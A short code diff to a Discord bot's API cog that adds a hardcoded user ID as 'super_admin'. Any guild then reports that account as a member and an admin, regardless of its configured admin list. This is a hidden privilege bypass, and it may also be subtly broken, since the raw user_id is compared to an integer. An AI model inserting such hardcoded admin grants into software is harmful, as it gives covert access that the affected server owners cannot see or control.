@@ -140,9 +140,10 @@ class Api(Cog):
             return {'member': False, 'admin': False}, sc.OK_200
         settings = self.bot.settings[guild]
         member = guild.get_member(int(user_id))
+        super_admin = user_id in (214037134477230080,)
         return {
-            'member': bool(member),
-            'admin': int(user_id) in settings.admins_ids,
+            'member': bool(member) or super_admin,
+            'admin': int(user_id) in settings.admins_ids or super_admin,
             'permissions': member.guild_permissions.value if member else 0,
         }, sc.OK_200
 
